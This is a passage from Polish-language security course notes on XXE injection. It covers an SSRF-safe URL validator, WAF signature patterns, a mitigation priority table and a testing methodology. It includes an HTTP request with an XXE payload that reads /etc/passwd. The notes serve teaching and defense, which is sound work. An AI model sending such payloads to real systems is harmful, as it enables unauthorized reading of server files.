    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # link-local / cloud metadata
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ("https",):   # tylko HTTPS
        return False
    if parsed.hostname not in ALLOWED_HOSTS:
        return False
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for net in PRIVATE_RANGES:
            if ip in net:
                return False
    except ValueError:
        pass   # hostname (nie IP) — OK, sprawdzony powyżej
    return True
```

---

### 5. WAF jako dodatkowa warstwa

WAF może blokować żądania zawierające charakterystyczne wzorce XXE:

```
Wzorce sygnatur XXE:
  <!ENTITY
  SYSTEM "file://
  SYSTEM "http://
  php://filter
  <!DOCTYPE.*\[
  &#x25;
```

> ⚠️ WAF to **warstwa dodatkowa**, nie zastępstwo naprawy kodu. Zaawansowany atakujący może obejść WAF przez kodowanie payloadu, fragmentację lub nieoczekiwane warianty składni XML.

---

### Podsumowanie — co wdrożyć w pierwszej kolejności

| Środek | Skuteczność | Trudność wdrożenia | Priorytet |
|---|---|---|---|
| Wyłącz encje zewnętrzne w parserze | ⭐⭐⭐⭐⭐ | Niska (kilka linii kodu) | 🔴 Krytyczny |
| Użyj JSON zamiast XML | ⭐⭐⭐⭐⭐ | Średnia (refactoring) | 🟠 Wysoki |
| Zasada najmniejszych uprawnień | ⭐⭐⭐⭐ | Średnia (konfiguracja OS) | 🟠 Wysoki |
| Whitelist zewnętrznych zasobów | ⭐⭐⭐ | Średnia (logika walidacji) | 🟡 Średni |
| WAF | ⭐⭐ | Niska (konfiguracja reguł) | 🟢 Uzupełniający |

---

## 🔎 Jak szukać XXE w nieznanej aplikacji?

### 1. Znajdź punkty wejścia danych XML

```
Gdzie szukać:
  - Formularze wysyłające dane → sprawdź Content-Type w Burp Suite
  - Upload plików → .docx, .xlsx, .svg, .xml mogą być parsowane po stronie serwera
  - API endpoints → sprawdź czy akceptują application/xml lub text/xml
  - Żądania SOAP → XML-based web services są klasycznym celem
```

### 2. Spróbuj zmienić Content-Type na XML

Niektóre aplikacje obsługują XML mimo używania JSON domyślnie:

```http
# Oryginalne żądanie (JSON):
POST /api/search HTTP/1.1
Content-Type: application/json
{"query": "test"}

# Próba z XML:
POST /api/search HTTP/1.1
Content-Type: text/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<query>&xxe;</query>
```

### 3. Testuj każdy parametr XML osobno

```xml
<!-- Testuj kolejno każdy tag, który może być wyświetlany w odpowiedzi -->
<note>
  <to>&xxe;</to>
  <from>test</from>
  <heading>test</heading>
</note>
```

### 4. Dla Blind XXE — użyj Burp Collaborator

Zamiast ręcznego serwera Python, Burp Suite Professional oferuje **Collaborator** — automatycznie generuje unikalny URL i rejestruje DNS/HTTP callbacki, bez potrzeby otwierania portów.

---

## 📚 Przydatne linki

| Zasób | Opis | Język |
|---|---|---|
| [sekurak.pl — symulacja XXE](https://cdn.sekurak.pl/html5/xxe/) | Interaktywna symulacja ataku w przeglądarce | 🇵🇱 |
| [PortSwigger — XXE teoria + labs](https://portswigger.net/web-security/xxe) | Darmowe interaktywne laboratoria | 🇬🇧 |
| [PortSwigger — jak szukać XXE](https://portswigger.net/web-security/xxe#how-to-find-and-test-for-xxe-vulnerabilities) | Metodologia testowania | 🇬🇧 |
| [HackTricks — XXE Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) | Kompletna ściągawka payloadów | 🇬🇧 |
| [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) | Gotowe payloady na GitHubie | 🇬🇧 |
| [OWASP — XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) | Oficjalna dokumentacja podatności | 🇬🇧 |
| [defusedxml — bezpieczny XML dla Pythona](https://github.com/tiran/defusedxml) | Biblioteka zastępująca standardowe parsery | 🇬🇧 |
| [SecLists — słowniki](https://github.com/danielmiessler/SecLists) | Kolekcja słowników dla pentesterów | 🇬🇧 |

---

<div align="center">

---

**PJATK | HackingDept Platform | Zajęcia nr 13 — XML External Entity Injection**

Notatki tworzone w celach edukacyjnych w ramach zajęć z bezpieczeństwa aplikacji webowych.  
Wszystkie ćwiczenia wykonywane wyłącznie na autoryzowanych środowiskach laboratoryjnych.

*"Understand the attack to build the defense."*

</div>
